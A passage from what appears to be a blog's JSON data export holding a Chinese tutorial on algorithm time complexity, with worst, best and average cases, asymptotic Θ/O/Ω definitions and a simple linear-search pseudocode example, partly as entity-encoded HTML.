style=\"color:red;\">在实际应用中，我们一般都是使用渐近时间复杂度代替实际时间复杂度来进行算法效率分析。</font>一般认为，一个渐近复杂度为n的算法要优于渐近复杂度为n^2的算法。\n\n注意，这并不是说渐近复杂度为n的算法在任何情况下都一定更高效，而是说在输入规模足够大后（大于临界条件n0），则前一个算法的最坏情况总是好于后一个算法的最坏情况。事实证明，在实践中这种分析是合理且有效的。\n\n类似的，还可以给出算法时间复杂度的上确界和下确界 ：\n```bash\n设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ο(g(n))，则说算法A的渐近时间复杂度上限为g(n)，且g(n)为F(n)的渐近上确界。\n设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ω(g(n))，则说算法A的渐近时间复杂度下限为g(n)，且g(n)为F(n)的渐近下确界。\n```\n这里一定要注意，由于我们是以F(n)最坏情况分析的，所以，我们可以100%保证在输入规模超过临界条件n0时，算法的运行时间一定不会高于渐近上确界，但是并不能100%保证算法运行时间不会低于渐近下确界，而只能100%保证算法的最坏运行时间不会低于渐近下确界。\n\n---\n\n### 相关链接\n算法的时间复杂度和空间复杂度总结：http://blog.csdn.net/zolalad/article/details/11848739","slug":"算法复杂度分析","published":1,"updated":"2016-11-20T10:53:34.204Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruleq004zgwtmh0gj9tok","content":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x901A;&#x5E38;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x4E24;&#x9879;&#x5206;&#x6790;&#x3002;<font style=\"color:red;\">&#x7B2C;&#x4E00;&#x662F;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x7684;&#x6B63;&#x786E;&#x6027;</font>&#xFF0C;&#x8FD9;&#x4E00;&#x6B65;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x5F62;&#x5F0F;&#x5316;&#x8BC1;&#x660E;&#x7684;&#x65B9;&#x6CD5;&#x53CA;&#x76F8;&#x5173;&#x63A8;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x5FAA;&#x73AF;&#x4E0D;&#x53D8;&#x5F0F;&#x3001;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x7B49;&#x3002;&#x800C;&#x5728;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x662F;&#x6B63;&#x786E;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;<font style=\"color:red;\">&#x7B2C;&#x4E8C;&#x5C31;&#x662F;&#x5206;&#x6790;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</font>&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x53CD;&#x6620;&#x4E86;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x968F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x589E;&#x957F;&#x800C;&#x589E;&#x957F;&#x7684;&#x91CF;&#x7EA7;&#xFF0C;&#x5728;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x80FD;&#x5F88;&#x597D;&#x53CD;&#x6620;&#x51FA;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x52A3;&#x4E0E;&#x5426;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4F5C;&#x4E3A;&#x7A0B;&#x5E8F;&#x5458;&#xFF0C;&#x638C;&#x63E1;&#x57FA;&#x672C;&#x7684;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x65B9;&#x6CD5;&#x662F;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5F88;&#x591A;&#x670B;&#x53CB;&#x5E76;&#x4E0D;&#x80FD;&#x6E05;&#x6670;&#x7684;&#x7406;&#x89E3;&#x8FD9;&#x4E00;&#x6982;&#x5FF5;&#xFF0C;&#x7A76;&#x5176;&#x539F;&#x56E0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x4ECE;&#x6570;&#x5B66;&#x5C42;&#x9762;&#x4E0A;&#x7406;&#x89E3;&#x5176;&#x672C;&#x8D28;&#xFF0C;&#x800C;&#x662F;&#x4E60;&#x60EF;&#x4E8E;&#x4ECE;&#x76F4;&#x89C2;&#x7406;&#x89E3;&#x3002;&#x4E0B;&#x9762;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x4E00;&#x6B65;&#x6B65;&#x8D70;&#x8FD1;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x672C;&#x8D28;&#x3002;</p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\"><a href=\"#&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\"></a>&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;</h3><p><strong>&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x7ED9;&#x5B9A;&#x7B97;&#x6CD5;A&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x51FD;&#x6570;F(n)&#xFF0C;&#x5F53;n=k&#x65F6;&#xFF0C;F(k)&#x8868;&#x793A;&#x7B97;&#x6CD5;A&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E3A;k&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x5219;&#x79F0;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</strong></p>\n<blockquote>\n<p>&#x53E6;&#x4E00;&#x79CD;&#x5B9A;&#x4E49;&#xFF1A;<br>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7B97;&#x6CD5;&#x4E2D;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x6B21;&#x6570;&#x662F;&#x95EE;&#x9898;&#x89C4;&#x6A21;n&#x7684;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7528;T(n)&#x8868;&#x793A;&#xFF0C;&#x82E5;&#x6709;&#x67D0;&#x4E2A;&#x8F85;&#x52A9;&#x51FD;&#x6570;f(n)&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&#x8D8B;&#x8FD1;&#x4E8E;&#x65E0;&#x7A77;&#x5927;&#x65F6;&#xFF0C;T(n)/f(n)&#x7684;&#x6781;&#x9650;&#x503C;&#x4E3A;&#x4E0D;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x5E38;&#x6570;&#xFF0C;&#x5219;&#x79F0;f(n)&#x662F;T(n)&#x7684;&#x540C;&#x6570;&#x91CF;&#x7EA7;&#x51FD;&#x6570;&#x3002;&#x8BB0;&#x4F5C;T(n)=O(f(n))&#xFF0C;&#x79F0;O(f(n))&#x4E3A;&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FDB;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;(O&#x662F;&#x6570;&#x91CF;&#x7EA7;&#x7684;&#x7B26;&#x53F7; )&#xFF0C;&#x7B80;&#x79F0;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</p>\n</blockquote>\n<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x8981;&#x660E;&#x786E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5173;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#x4E0B;&#x5B9A;&#x4E49;&#xFF0C;&#x975E;&#x4E25;&#x683C;&#x7684;&#x8BB2;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x6307;&#x7B97;&#x6CD5;A&#x6240;&#x63A5;&#x53D7;&#x8F93;&#x5165;&#x7684;&#x81EA;&#x7136;&#x72EC;&#x7ACB;&#x4F53;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x6765;&#x8BF4;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E00;&#x822C;&#x5C31;&#x662F;&#x5F85;&#x6392;&#x5E8F;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6C42;&#x4E24;&#x4E2A;&#x540C;&#x578B;&#x65B9;&#x9635;&#x4E58;&#x79EF;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x5355;&#x4E2A;&#x65B9;&#x9635;&#x7684;&#x7EF4;&#x6570;&#x3002;&#x4E3A;&#x4E86;&#x7B80;&#x5355;&#x8D77;&#x89C1;&#xFF0C;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8BA8;&#x8BBA;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x603B;&#x662F;&#x5047;&#x8BBE;&#x7B97;&#x6CD5;&#x7684;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x7528;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;&#x7684;&#xFF0C;&#x5373;n=1,2,3,&#x2026;&#x2026;,k,&#x2026;&#x2026;</p>\n<p>&#x6211;&#x4EEC;&#x8FD8;&#x77E5;&#x9053;&#xFF0C;&#x5BF9;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x4EC5;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x8FD8;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x7684;&#x7279;&#x6027;&#x548C;&#x5177;&#x4F53;&#x7684;&#x786C;&#x4EF6;&#x73AF;&#x5883;&#x5728;&#x67D0;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x3002;&#x6240;&#x4EE5;&#x60F3;&#x8981;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7EDF;&#x4E00;&#x7CBE;&#x786E;&#x7684;F(n)&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E00;&#x4E0B;&#x4E24;&#x4E2A;&#x8BF4;&#x660E;&#xFF1A;<br>1.&#x5FFD;&#x7565;&#x786C;&#x4EF6;&#x53CA;&#x73AF;&#x5883;&#x56E0;&#x7D20;&#xFF0C;&#x5047;&#x8BBE;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x786C;&#x4EF6;&#x6761;&#x4EF6;&#x548C;&#x73AF;&#x5883;&#x6761;&#x4EF6;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x81F4;&#x7684;&#x3002;<br>2.&#x5BF9;&#x4E8E;&#x8F93;&#x5165;&#x7279;&#x6027;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x5E76;&#x5E26;&#x5165;&#x51FD;&#x6570;&#x89E3;&#x6790;&#x5F0F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\"><a href=\"#&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\"></a>&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;</h3><p>&#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x670B;&#x53CB;&#x4EEC;&#x7406;&#x89E3;&#xFF0C;&#x6211;&#x5C06;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x6559;&#x79D1;&#x4E66;&#x4E0A;&#x60EF;&#x7528;&#x7684;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x3001;&#x5408;&#x5E76;&#x6392;&#x5E8F;&#x7B49;&#x7ECF;&#x5178;&#x793A;&#x4F8B;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x5341;&#x5206;&#x7B80;&#x5355;&#x7684;&#x7B97;&#x6CD5;&#x4F5C;&#x4E3A;&#x793A;&#x4F8B;&#x3002;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x95EE;&#x9898;&#x5B9A;&#x4E49;&#xFF1A;<br>&#x8F93;&#x5165;&#x2014;&#x2014;&#x6B64;&#x95EE;&#x9898;&#x8F93;&#x5165;&#x4E3A;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#xFF0C;&#x5176;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x4E3A;n&#xFF0C;n&#x4E3A;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x3002;&#x5E8F;&#x5217;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x4E3A;&#x4ECE;1&#x5230;n&#x8FD9;n&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x4F46;&#x5176;&#x987A;&#x5E8F;&#x4E3A;&#x5B8C;&#x5168;&#x968F;&#x673A;&#x3002;<br>&#x8F93;&#x51FA;&#x2014;&#x2014;&#x5143;&#x7D20;n&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#xFF08;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF09;</p>\n<p>&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E0B;&#x9762;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x5176;&#x89E3;&#x51B3;&#x7B97;&#x6CD5;&#x4E4B;&#x4E00;&#xFF08;&#x4F2A;&#x4EE3;&#x7801;&#xFF09;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LocationN(A)</span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=1;i&lt;=n;i++)-----------------------t1</span><br><span class=\"line\">    {</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(A[i] == n) ----------------------------t2</span><br><span class=\"line\">                { <span class=\"built_in\">return</span> i; }------------------------t3</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x3002;&#x5176;&#x4E2D;t1&#x3001;t2&#x548C;t3&#x5206;&#x522B;&#x8868;&#x793A;&#x6B64;&#x884C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<p>&#x9996;&#x5148;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;n&#x662F;&#x5F71;&#x54CD;&#x7B97;&#x6CD5;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x56E0;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x5728;n&#x56FA;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x4E5F;&#x4F1A;&#x5F71;&#x54CD;&#x5176;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x3002;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x5C31;&#x6392;&#x5728;&#x5E8F;&#x5217;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#xFF0C;&#x90A3;&#x4E48;&#x6B64;&#x65F6;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;t1+t2+t3&#x201D;&#x3002;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x6392;&#x5728;&#x5E8F;&#x5217;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#xFF0C;&#x5219;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;n<em>t1+n</em>t2+t3=(t1+t2)*n+t3&#x201D;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#xFF0C;&#x800C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x7EBF;&#x6027;&#x51FD;&#x6570;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x5982;&#x4F55;&#x5462;&#xFF1F;</p>\n<p>&#x95EE;&#x9898;&#x5B9A;&#x4E49;&#x8BF4;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x5B8C;&#x5168;&#x968F;&#x673A;&#xFF0C;&#x5373;n&#x51FA;&#x73B0;&#x5728;1&#x2026;n&#x8FD9;n&#x4E2A;&#x4F4D;&#x7F6E;&#x4E0A;&#x662F;&#x7B49;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x5373;&#x6982;&#x7387;&#x5747;&#x4E3A;1/n&#x3002;&#x800C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x6267;&#x884C;&#x6B21;&#x6570;&#x5373;&#x4E3A;&#x6267;&#x884C;&#x6B21;&#x6570;&#x7684;&#x6570;&#x5B66;&#x671F;&#x671B;&#xFF0C;&#x5176;&#x89E3;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E</span><br><span class=\"line\">= p(n=1)*1+p(n=2)*2+...+p(n=n)*n</span><br><span class=\"line\">= (1/n)*(1+2+...+n)</span><br><span class=\"line\">= (1/n)*((n/2)*(1+n))</span><br><span class=\"line\">= (n+1)/2</span><br></pre></td></tr></table></figure></p>\n<p>&#x5373;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;for&#x5FAA;&#x73AF;&#x8981;&#x6267;&#x884C;(n+1)/2&#x6B21;&#xFF0C;&#x5219;&#x5E73;&#x5747;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;(t1+t2)<em>(n+1)/2+t3&#x201D;&#x3002;<br>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x5F97;&#x51FA;&#x5206;&#x6790;&#x7ED3;&#x8BBA;&#xFF1A;<br>**t1+t2+t3 &lt;= F(n) &lt;= (t1+t2)</em>n+t3&#xFF0C;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;F(n) = (t1+t2)<em>(n+1)/2+t3*</em></p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;</h3><p><strong>&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;F(n)&#x8FDB;&#x884C;&#x4E86;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x5982;&#x6B64;&#x7CBE;&#x786E;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x4E0B;&#xFF1A;<br>1.&#x5728;&#x8F83;&#x590D;&#x6742;&#x7684;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x662F;&#x975E;&#x5E38;&#x590D;&#x6742;&#x7684;&#x3002;<br>2.&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x5173;&#x5FC3;F(n)&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x91CF;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x5173;&#x5FC3;&#x5176;&#x91CF;&#x7EA7;&#x3002;</strong></p>\n<p>&#x57FA;&#x4E8E;&#x6B64;&#xFF0C;&#x63D0;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5728;&#x6B63;&#x5F0F;&#x7ED9;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E4B;&#x524D;&#xFF0C;&#x8981;&#x5148;&#x7ED9;&#x51FA;&#x51E0;&#x4E2A;&#x6570;&#x5B66;&#x5B9A;&#x4E49;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5B9A;&#x4E49;&#x4E00;&#xFF1A;&#x398;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c1&#x3001;c2&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;c1g(n)&lt;=f(n)&lt;=c2g(n)&#x6052;&#x6210;&#x7ACB;}</span><br><span class=\"line\">&#x5B9A;&#x4E49;&#x4E8C;&#xFF1A;&#x39F;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=f(n)&lt;=cg(n)&#x6052;&#x6210;&#x7ACB;}</span><br><span class=\"line\">&#x5B9A;&#x4E49;&#x4E09;&#xFF1A;&#x3A9;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=cg(n)&lt;=f(n)&#x6052;&#x6210;&#x7ACB;}</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E09;&#x4E2A;&#x5B9A;&#x4E49;&#x5176;&#x5B9E;&#x90FD;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x96C6;&#x5408;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x540C;&#x3002;&#x6709;&#x4E86;&#x4EE5;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E86;&#x3002;</p>\n<p>&#x4E0D;&#x8FC7;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;F(n)&#x4E0D;&#x662F;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x4ED6;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x5185;&#x53D8;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5173;&#x5FC3;&#x54EA;&#x4E2A;F(n)&#x5462;&#xFF1F;&#x4E00;&#x822C;&#x6211;&#x4EEC;&#x5728;&#x5206;&#x6790;&#x7B97;&#x6CD5;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x7684;F(n)&#x6765;&#x8BC4;&#x4EF7;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x5982;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;<br>1.&#x5982;&#x679C;&#x77E5;&#x9053;&#x4E86;&#x6700;&#x574F;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x4E0D;&#x80FD;&#x6BD4;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x66F4;&#x574F;&#x4E86;&#x3002;<br>2.&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x53D1;&#x751F;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6982;&#x7387;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#x7684;&#xFF0C;&#x5982;&#x67E5;&#x627E;&#x95EE;&#x9898;&#x4E2D;&#x5F85;&#x67E5;&#x5143;&#x7D20;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x4E14;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#